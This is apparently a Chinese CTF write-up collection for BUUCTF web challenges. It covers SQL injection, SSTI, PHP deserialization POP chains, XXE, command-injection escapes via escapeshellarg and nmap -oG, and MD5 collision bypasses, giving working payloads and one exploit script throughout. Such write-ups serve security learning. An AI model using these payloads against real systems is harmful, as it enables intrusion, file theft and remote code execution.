# BUUCTF WEB 2

## [GYCTF2020]Blacklist

sql注入，先找一下注入点

```http
/?inject=1'order+by+2--+
```

有回显，然后尝试爆库，发现被过滤

```php
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```

select被过滤，尝试HANDLER

```sql
HANDLER tbl_name OPEN [ [AS] alias]

HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ { FIRST | NEXT }
    [ WHERE where_condition ] [LIMIT ... ]

HANDLER tbl_name CLOSE
```

但使用HANDLER需要已知表名，所以先尝试拿到表名，观察上面过滤语句发现没有过滤`;`，尝试堆叠注入

```sql
/?inject=1';show tables--+
/?inject=1';show columns form table_name--+
```

有回显，拿到表名，字段名，使用HANDLER查询字段

```sql
-1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;--+
```

使用HANDLER必须要可以使用`;`

## [RoarCTF 2019]Easy Java

Java web, WEB-INF, web.xml

需要改成POST才能访问，先访问web.xml

```
WEB-INF/web.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <welcome-file-list>
        <welcome-file>Index</welcome-file>
    </welcome-file-list>

    <servlet>
        <servlet-name>IndexController</servlet-name>
        <servlet-class>com.wm.ctf.IndexController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>IndexController</servlet-name>
        <url-pattern>/Index</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>LoginController</servlet-name>
        <servlet-class>com.wm.ctf.LoginController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>LoginController</servlet-name>
        <url-pattern>/Login</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>DownloadController</servlet-name>
        <servlet-class>com.wm.ctf.DownloadController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>DownloadController</servlet-name>
        <url-pattern>/Download</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>FlagController</servlet-name>
        <servlet-class>com.wm.ctf.FlagController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>FlagController</servlet-name>
        <url-pattern>/Flag</url-pattern>
    </servlet-mapping>

</web-app>
```

拿到目录结构，直接访问FlagController.class

```
WEB-INF/classes/com/wm/ctf/FlagController.class
```

拿到flag

## [网鼎杯 2018]Fakebook

显示目录扫描，扫到robots.txt，flag.php

```php
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
}
```

blog不能进行ssrf利用，所以使用别的方式，观察到用户界面有序号，尝试sqli

```
/view.php?no=1 order by 5
```

报错，可以sqli，但是union select的时候被ban了，发现是过滤了`union select`，这个组合，所以直接使用`/**/`绕过

```
/view.php?no=-1+union/**/select+1,load_file('/var/www/html/flag.php'),3,4--+
```

## [BJDCTF2020]The mystery of ip

php SSTI 模板注入

```
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```

## [网鼎杯 2020 朱雀组]phpweb

```http
POST /index.php HTTP/1.1
Host: ce0c0619-ce1e-420f-8e2e-5d6f9ab67e24.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Origin: http://ce0c0619-ce1e-420f-8e2e-5d6f9ab67e24.node5.buuoj.cn:81
Connection: close
Referer: http://ce0c0619-ce1e-420f-8e2e-5d6f9ab67e24.node5.buuoj.cn:81/index.php
Upgrade-Insecure-Requests: 1

func=1&p=1
```

可以发现是传入函数和参数来进行利用，尝试eval等函数发现不行，尝试file_get_contents来读取文件内容，但不知道flag在哪个地方，所以先读取目前文件内容

```php
<?php
$disable_fun = array("exec", "shell_exec", "system", "passthru", "proc_open", "show_source", "phpinfo", "popen", "dl", "eval", "proc_terminate", "touch", "escapeshellcmd", "escapeshellarg", "assert", "substr_replace", "call_user_func_array", "call_user_func", "array_filter", "array_walk",  "array_map", "registregister_shutdown_function", "register_tick_function", "filter_var", "filter_var_array", "uasort", "uksort", "array_reduce", "array_walk", "array_walk_recursive", "pcntl_exec", "fopen", "fwrite", "file_put_contents");
function gettime($func, $p)
{
    $result = call_user_func($func, $p);
    $a = gettype($result);
    if ($a == "string") {
        return $result;
    } else {
        return "";
    }
}
class Test
{
    var $p = "Y-m-d h:i:s a";
    var $func = "date";
    function __destruct()
    {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}
$func = $_REQUEST["func"];
$p = $_REQUEST["p"];

if ($func != null) {
    $func = strtolower($func);
    if (!in_array($func, $disable_fun)) {
        echo gettime($func, $p);
    } else {
        die("Hacker...");
    }
}
```

可以看到过滤了很多函数，观察到有Test类，可以尝试反序列化利用，并且没有过滤unserialize函数，直接构造POP链来查找flag所在位置并读取内容

```
O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
```

## [BSidesCF 2020]Had a bad day

php伪协议读文件，必须要base64编码才能回显

```
php://filter/read=convert.base64-encode/resource=index.php
```

先看index，发现有过滤

```php
<?php
$file = $_GET['category'];

if (isset($file)) {
    if (strpos($file, "woofers") !==  false || strpos($file, "meowers") !==  false || strpos($file, "index")) {
        include($file . '.php');
    } else {
        echo "Sorry, we currently only support woofers and meowers.";
    }
}
```

payload必须要带有woofers、meowers、index才可以被包含，所以使用如下payload

```
php://filter/read=convert.base64-encode/write=woofers/resource=flag
```

## [BJDCTF2020]ZJCTF，不过如此

```php
 <?php
error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }
    include($file);  //next.php
}
else{
    highlight_file(__FILE__);
}
?>
```

利用php://input或者php://data来向文件写入内容，再利用php://filter来读取文件内容

```http
GET /?text=php://input&file=php://filter/read=convert.base64-encode/resource=next.php HTTP/1.1
Host: b3ec03ec-6e5d-451f-b4f4-44bde10654ee.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 14

I have a dream
```

得到内容

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;
function complex($re, $str)
{
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}
foreach ($_GET as $re => $str) {
    echo complex($re, $str) . "\n";
}
function getFlag()
{
    @eval($_GET['cmd']);
}
```

观察到preg_replace函数中使用了/e，并且php版本为PHP/5.6.40，存在RCE漏洞

```
/next.php?\.*=${getflag()}&cmd=system('cat+/flag');
/next.php?\S*=${getflag()}&cmd=system('cat+/flag');
```

因为在GET传参时`.`会变成`_`所以需要使用第二个payload

## [BUUCTF 2018]Online Tool

```php
<?php
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
if (!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellarg($host);
    $sandbox = md5("glzjin" . $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox ' . $sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F " . $host);
}
```

`HTTP_X_FORWARDED_FOR`就是`X_FORWARDED_FOR`头，`REMOTE_ADDR`就是客户端IP，从题目来看，无所谓

`escapeshellarg()`把字符串转义成shell命令参数，把字符串中的单引号变成转义的单引号，并把这个转义后的单引号用两个单引号引起来。如

```
' <?php echo `pwd` ?> -oG 1.php '
''\'' <?php echo `pwd` ?> -oG 1.php '\'''
```

```
escapeshellarg — Escape a string to be used as a shell argument

escapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument. This function should be used to escape individual arguments to shell functions coming from user input. The shell functions include exec(), system() and the backtick operator.

On Windows, escapeshellarg() instead replaces percent signs, exclamation marks (delayed variable substitution) and double quotes with spaces and adds double quotes around the string. Furthermore, each streak of consecutive backslashes (\) is escaped by one additional backslash.
```

`escapeshellarg()`转义所有元字符，单纯的转义，不加单引号，如

```
' <?php echo `pwd` ?> -oG 1.php '
''\'' <?php echo `pwd` ?> -oG 1.php '\'''
''\\'' \<\?php echo \`pwd\` \?\> -oG 1.php '\\'''
```

```
escapeshellcmd — Escape shell metacharacters

escapeshellcmd() escapes any characters in a string that might be used to trick a shell command into executing arbitrary commands. This function should be used to make sure that any data coming from user input is escaped before this data is passed to the exec() or system() functions, or to the backtick operator.

Following characters are preceded by a backslash: &#;`|*?~<>^()[]{}$\, \x0A and \xFF. ' and " are escaped only if they are not paired. On Windows, all these characters plus % and ! are preceded by a caret (^).
```

可以看到经过这两个函数的共同作用后，中间的命令逃逸了出来，所以我们可以尝试利用

观察到给定的命令为`echo system("nmap -T5 -sT -Pn --host-timeout 2 -F " . $host);`，了解到nmap有一个-oG参数可以把扫描内容输出到文件中，而我们可以让恶意命令逃逸出来，所以我们可以输出为任意格式的文件，同时逃逸出对应格式文件的恶意代码，从而拿到shell

## [GXYCTF2019]禁止套娃

啥也没有，扫一下目录，发现.git泄露，githack下载下来

```php
<?php
include "flag.php";
echo "flag在哪里呢<br>";
if (isset($_GET['exp'])) {
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if (';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            } else {
                die("还差一点哦！");
            }
        } else {
            die("再好好想想！");
        }
    } else {
        die("还想读flag 臭弟弟");
    }
}
// highlight_file(__FILE__);
```

无参数RCE，过滤的比较少，var_dump一下，但var_dump必须要参数，所以构造出一个`.`，localeconv()第一个返回的就是`.`，所以使用current()把第一个内容取出来，在用scandir()获取一下目录内容

```
/?exp=var_dump(scandir(current(localeconv())));
```

发现flag.php，使用readfile()读取

```
/?exp=readfile(next(array_reverse(scandir(current(localeconv())))));
```

具体payload看数组内容排列

## [NCTF2019]Fake XML cookbook

XXE(XML External Entity)

可以利用外部实体进行注入，报文格式为：

```http
POST /doLogin.php HTTP/1.1
Host: 11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/xml;charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 57
Origin: http://11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81
Connection: close
Referer: http://11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81/

<user><username>1</username><password>1</password></user>
```

我们可以对发送的XML类型数据进行修改，注入外部实体，同时在返回的用户名和密码数据中把恶意操作回显出来

```http
POST /doLogin.php HTTP/1.1
Host: 11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/xml;charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 145
Origin: http://11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81
Connection: close
Referer: http://11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81/

<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY test SYSTEM "file:///flag">
]>
<user><username>&test;</username><password>1</password></user>
```

# [GWCTF 2019]我有一个数据库

啥也没有，扫一下目录，发现有phpmyadmin，进去也是啥也没有

可能是phpmyadmin本身有漏洞，直接google到POC，但我没找到，开xray扫出来了。。。

![image-20240309111211220](/Users/fanbig/Library/Application Support/typora-user-images/image-20240309111211220.png)

文件包含漏洞，直接读取flag

## [BJDCTF2020]Mark loves cat

githack

```php
<?php
include 'flag.php';
$yds = "dog";
$is = "cat";
$handsome = 'yds';
foreach ($_POST as $x => $y) {
    $$x = $y;
}
foreach ($_GET as $x => $y) {
    $$x = $$y;
}
foreach ($_GET as $x => $y) {
    if ($_GET['flag'] === $x && $x !== 'flag') {
        exit($handsome);
    }
}
if (!isset($_GET['flag']) && !isset($_POST['flag'])) {
    exit($yds);
}
if ($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag') {
    exit($is);
}
echo "the flag is: " . $flag;
```

payload

```
index.php?yds=flag
```

## [WUSTCTF2020]朴实无华

啥也没有，目录扫描，得到robots.txt和一个fake_flag.php，fake_flag.php响应报文中有另一个文件内容，如下

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>
```

level1用科学记数法绕过，因为php版本为5.5，payload

```
/fl4g.php?num=1e5
```

level2经典绕过，payload

```
/fl4g.php?num=1e5&md5=0e215962017
```

level3空格绕过，用${IFS}或者$IFS$1绕过，cat也被过滤，可以用tac查看，payload

```
/fl4g.php?num=1e5&md5=0e215962017&get_flag=tac${IFS}./fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
```

#  [BJDCTF2020]Cookie is so stable

SSTI

直接FUZZ

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

## [安洵杯 2019]easy_web

```
GET /index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd= HTTP/1.1
```

观察URL，先解码img内容，

![image-20240309162624969](/Users/fanbig/Library/Application Support/typora-user-images/image-20240309162624969.png)

可以知道先两次base64，再一次hex，得到网页上显示的图片，根据这个信息，我们可以通过这个方式把网站源码也经过这种方式回显出来

![image-20240309162921129](/Users/fanbig/Library/Application Support/typora-user-images/image-20240309162921129.png)

```
GET /index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&cmd= HTTP/1.1
```

```yaml
HTTP/1.1 200 OK
Server: openresty
Date: Sat, 09 Mar 2024 08:30:04 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 1955
Connection: close
Vary: Accept-Encoding
X-Powered-By: PHP/7.1.33
Cache-Control: no-cache

<img src='data:image/gif;base64,PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2UgewogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4='></img><br><br>md5 is funny ~<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
```

解码回显的内容，得到

```php
<?php
error_reporting(E_ALL || ~E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd']))
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));
$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixiï½ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo ("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}
```

可以知道过滤了很多命令，而且只需要一个md5的强比较绕过就行，payload

```
a=M%C9h%FF%0E%E3%5C+%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
&
b=M%C9h%FF%0E%E3%5C+%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
```

现在就可以执行命令了，要读取flag还要绕过preg_match()，paylaod

```
/index.php?cmd=ca\t+/flag
```

## [MRCTF2020]Ezpop

```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier
{
    protected  $var;
    public function append($value)
    {
        include($value);
    }
    public function __invoke()
    {
        $this->append($this->var);
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file = 'index.php')
    {
        $this->source = $file;
        echo 'Welcome to ' . $this->source . "<br>";
    }
    public function __toString()
    {
        return $this->str->source;
    }

    public function __wakeup()
    {
        if (preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test
{
    public $p;
    public function __construct()
    {
        $this->p = array();
    }

    public function __get($key)
    {
        $function = $this->p;
        return $function();
    }
}

if (isset($_GET['pop'])) {
    @unserialize($_GET['pop']);
} else {
    $a = new Show;
    highlight_file(__FILE__);
}
```

POP

```
__wakeup()-->__toString()-->__get()-->__invoke()-->append()
```

注意是`include()`包含的文件需要转换成base64才能回显flag，exp如下：

```php
<?php
class Modifier
{
    protected $var = "php://filter/read=convert.base64-encode/resource=flag.php";

    public function append($value)
    {
        include($value);
    }

    public function __invoke()
    {
        $this->append($this->var);
    }
}

class Show
{
    public $source;
    public $str;

    public function __construct()
    {
    }

    public function __toString()
    {
        return $this->str->source;
    }

    public function __wakeup()
    {
        if (preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test
{
    public $p;

    public function __construct()
    {
        $this->p = new Modifier();
    }

    public function __get($key)
    {
        $function = $this->p;
        return $function();
    }
}

$a = new Show();
$a->str = new Test();
$b = new Test();

$show = new Show();
$show->source = $a;
$show->str = $b;
echo urlencode(serialize($show));
```

## [安洵杯 2019]easy_serialize_php

